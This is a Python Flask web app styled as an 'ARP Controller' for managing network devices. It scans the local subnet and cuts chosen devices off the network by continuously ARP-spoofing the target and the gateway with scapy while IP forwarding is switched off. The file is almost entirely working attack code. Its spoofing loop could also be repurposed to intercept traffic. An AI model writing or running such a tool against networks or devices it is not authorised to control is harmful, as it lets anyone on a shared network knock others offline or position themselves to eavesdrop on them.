import os
import sys
import platform
import subprocess
import threading
import time
import atexit
import ipaddress
from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS

try:
    from scapy.all import ARP, Ether, srp, send, get_if_hwaddr, get_if_addr, conf, getmacbyip
except ImportError:
    print("scapy is required. Install with: pip install scapy")
    sys.exit(1)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
FRONTEND_DIR = os.path.join(BASE_DIR, "frontend")

app = Flask(__name__, static_folder=FRONTEND_DIR, static_url_path="")
CORS(app)

blocked_devices: dict[str, dict] = {}
spoof_threads: dict[str, threading.Thread] = {}
stop_events: dict[str, threading.Event] = {}
scan_results: list[dict] = []
scan_lock = threading.Lock()
block_lock = threading.Lock()
gateway_ip: str = ""
gateway_mac: str = ""
local_ip: str = ""
local_mac: str = ""
interface = None
original_ip_forward: bool = False


def _is_admin():
    try:
        if platform.system() == "Windows":
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0
    except Exception:
        return False


def get_network_info():
    global gateway_ip, gateway_mac, local_ip, local_mac, interface

    if platform.system() == "Windows":
        result = subprocess.run(
            ["route", "print", "0.0.0.0"],
            capture_output=True, text=True, timeout=10
        )
        for line in result.stdout.strip().split("\n"):
            parts = line.split()
            if len(parts) >= 3 and parts[0] == "0.0.0.0" and parts[1] == "0.0.0.0":
                gateway_ip = parts[2]
                break
    else:
        result = subprocess.run(
            ["ip", "route"],
            capture_output=True, text=True, timeout=10
        )
        for line in result.stdout.split("\n"):
            if line.startswith("default"):
                parts = line.split()
                gateway_ip = parts[2]
                if len(parts) > 4:
                    interface = parts[4]
                break

    if not gateway_ip:
        print("ERROR: Could not determine gateway IP. Are you connected to a network?")
        sys.exit(1)

    gateway_mac = getmacbyip(gateway_ip) or "ff:ff:ff:ff:ff:ff"

    iface = conf.iface
    interface = iface
    try:
        local_ip = get_if_addr(iface)
    except Exception:
        local_ip = ""
    try:
        local_mac = get_if_hwaddr(iface)
    except Exception:
        local_mac = ""

    if not local_ip or local_ip == "0.0.0.0":
        for iface_name in conf.ifaces:
            try:
                addr = get_if_addr(iface_name)
                if addr and addr != "0.0.0.0" and not addr.startswith("127."):
                    local_ip = addr
                    local_mac = get_if_hwaddr(iface_name)
                    interface = iface_name
                    break
            except Exception:
                continue

    print(f"Local IP: {local_ip}, MAC: {local_mac}")
    print(f"Gateway IP: {gateway_ip}, MAC: {gateway_mac}")
    print(f"Interface: {interface}")


def get_subnet():
    try:
        if local_ip and "/" in local_ip:
            return str(ipaddress.ip_network(local_ip, strict=False))
        if local_ip:
            return str(ipaddress.ip_network(f"{local_ip}/24", strict=False))
    except Exception:
        pass
    return "192.168.0.0/24"


def arp_scan():
    global scan_results
    with scan_lock:
        subnet = get_subnet()
        arp = ARP(pdst=subnet)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp

        try:
            answered, _ = srp(
                packet, timeout=3,
                iface=interface if interface else None,
                verbose=False
            )
        except Exception as e:
            print(f"ARP scan error: {e}")
            return scan_results

        results = []
        for sent, received in answered:
            ip = received.psrc
            mac = received.hwsrc
            if ip == local_ip:
                continue
            results.append({
                "ip": ip,
                "mac": mac,
                "blocked": ip in blocked_devices,
                "hostname": "",
            })

        scan_results = results
        return results


def _check_ip_forwarding():
    global original_ip_forward
    if platform.system() == "Windows":
        try:
            result = subprocess.run(
                ["reg", "query",
                 r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                 "/v", "IPEnableRouter"],
                capture_output=True, text=True, timeout=5
            )
            original_ip_forward = "0x1" in result.stdout or "REG_DWORD    0x1" in result.stdout
        except Exception:
            original_ip_forward = False
    else:
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
                original_ip_forward = f.read().strip() == "1"
        except Exception:
            original_ip_forward = False


def set_ip_forwarding(enable: bool):
    if platform.system() == "Windows":
        val = "1" if enable else "0"
        try:
            subprocess.run(
                ["reg", "add",
                 r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                 "/v", "IPEnableRouter", "/t", "REG_DWORD",
                 "/d", val, "/f"],
                capture_output=True, timeout=5
            )
        except Exception as e:
            print(f"Failed to set IP forwarding: {e}")
    else:
        val = "1" if enable else "0"
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write(val)
        except Exception as e:
            print(f"Failed to set IP forwarding: {e}")


def spoof_loop(target_ip: str, target_mac: str, stop_event: threading.Event):
    gw_mac = gateway_mac or getmacbyip(gateway_ip) or "ff:ff:ff:ff:ff:ff"
    attacker_mac = local_mac
    if not attacker_mac:
        try:
            attacker_mac = get_if_hwaddr(interface if interface else conf.iface)
        except Exception:
            print("Could not determine attacker MAC")
            return

    while not stop_event.is_set():
        arp_to_target = ARP(
            op=2, pdst=target_ip, hwdst=target_mac,
            psrc=gateway_ip, hwsrc=attacker_mac
        )
        arp_to_gateway = ARP(
            op=2, pdst=gateway_ip, hwdst=gw_mac,
            psrc=target_ip, hwsrc=attacker_mac
        )
        try:
            send(arp_to_target, iface=interface if interface else None, verbose=False)
            send(arp_to_gateway, iface=interface if interface else None, verbose=False)
        except Exception as e:
            print(f"Error sending ARP spoof: {e}")
        stop_event.wait(2)


def _get_mac_for_ip(target_ip: str) -> str | None:
    for dev in scan_results:
        if dev["ip"] == target_ip:
            return dev["mac"]
    return getmacbyip(target_ip)


def restore_arp(target_ip: str, target_mac: str):
    gw_mac = gateway_mac or getmacbyip(gateway_ip)
    if not gw_mac:
        return

    for _ in range(5):
        arp_to_target = ARP(
            op=2, pdst=target_ip, hwdst=target_mac,
            psrc=gateway_ip, hwsrc=gw_mac
        )
        arp_to_gateway = ARP(
            op=2, pdst=gateway_ip, hwdst=gw_mac,
            psrc=target_ip, hwsrc=target_mac
        )
        try:
            send(arp_to_target, iface=interface if interface else None, verbose=False)
            send(arp_to_gateway, iface=interface if interface else None, verbose=False)
        except Exception:
            pass
        time.sleep(0.5)


def _cleanup():
    print("\nCleaning up... restoring ARP tables...")
    for ip in list(blocked_devices.keys()):
        if ip in stop_events:
            stop_events[ip].set()
    for ip, t in list(spoof_threads.items()):
        t.join(timeout=5)
    for ip, info in list(blocked_devices.items()):
        mac = info.get("mac")
        if mac:
            restore_arp(ip, mac)
    blocked_devices.clear()
    stop_events.clear()
    spoof_threads.clear()
    set_ip_forwarding(original_ip_forward)
    print("Cleanup complete.")


atexit.register(_cleanup)


@app.route("/")
def index():
    return send_from_directory(FRONTEND_DIR, "index.html")


@app.route("/<path:path>")
def static_files(path):
    return send_from_directory(FRONTEND_DIR, path)


@app.route("/api/scan", methods=["GET"])
def api_scan():
    results = arp_scan()
    return jsonify({"devices": results})


@app.route("/api/devices", methods=["GET"])
def api_devices():
    for dev in scan_results:
        dev["blocked"] = dev["ip"] in blocked_devices
    return jsonify({"devices": scan_results})


@app.route("/api/block", methods=["POST"])
def api_block():
    data = request.get_json(force=True)
    if not data or "ip" not in data:
        return jsonify({"error": "IP address required"}), 400

    target_ip = data["ip"]

    with block_lock:
        if target_ip in blocked_devices:
            return jsonify({"error": "Device already blocked"}), 400

        if target_ip == gateway_ip:
            return jsonify({"error": "Cannot block the gateway"}), 400

        if target_ip == local_ip:
            return jsonify({"error": "Cannot block yourself"}), 400

        target_mac = _get_mac_for_ip(target_ip)
        if not target_mac:
            return jsonify({"error": "Cannot resolve MAC address for this IP"}), 400

        set_ip_forwarding(False)

        stop_event = threading.Event()
        stop_events[target_ip] = stop_event

        t = threading.Thread(
            target=spoof_loop,
            args=(target_ip, target_mac, stop_event),
            daemon=True
        )
        spoof_threads[target_ip] = t
        t.start()

        blocked_devices[target_ip] = {
            "ip": target_ip,
            "mac": target_mac,
            "blocked_at": time.time(),
        }

        for dev in scan_results:
            if dev["ip"] == target_ip:
                dev["blocked"] = True

    print(f"Blocked: {target_ip}")
    return jsonify({"status": "blocked", "ip": target_ip})


@app.route("/api/unblock", methods=["POST"])
def api_unblock():
    data = request.get_json(force=True)
    if not data or "ip" not in data:
        return jsonify({"error": "IP address required"}), 400

    target_ip = data["ip"]

    with block_lock:
        if target_ip not in blocked_devices:
            return jsonify({"error": "Device not blocked"}), 400

        if target_ip in stop_events:
            stop_events[target_ip].set()
            del stop_events[target_ip]

        if target_ip in spoof_threads:
            spoof_threads[target_ip].join(timeout=5)
            del spoof_threads[target_ip]

        target_mac = blocked_devices[target_ip].get("mac") or _get_mac_for_ip(target_ip)
        if target_mac:
            restore_arp(target_ip, target_mac)

        del blocked_devices[target_ip]

        if not blocked_devices:
            set_ip_forwarding(original_ip_forward)

        for dev in scan_results:
            if dev["ip"] == target_ip:
                dev["blocked"] = False

    print(f"Unblocked: {target_ip}")
    return jsonify({"status": "unblocked", "ip": target_ip})


@app.route("/api/status", methods=["GET"])
def api_status():
    status = {}
    for ip, info in blocked_devices.items():
        status[ip] = {
            "blocked": True,
            "duration": time.time() - info["blocked_at"],
        }
    return jsonify({
        "blocked": status,
        "gateway": gateway_ip,
        "local_ip": local_ip,
    })


if __name__ == "__main__":
    print("=" * 50)
    print("  ARP Controller - Network Device Manager")
    print("=" * 50)

    if not _is_admin():
        print("\nWARNING: Not running with administrator/root privileges!")
        print("ARP spoofing requires elevated privileges. Please restart as admin.\n")

    print("Initializing network info...")
    get_network_info()
    _check_ip_forwarding()
    print(f"Subnet: {get_subnet()}")
    print(f"IP forwarding was: {'ON' if original_ip_forward else 'OFF'}")
    print("\nServer starting on http://localhost:5000")
    print("Open this URL in your browser to use the application.\n")
    app.run(host="0.0.0.0", port=5000, debug=False)
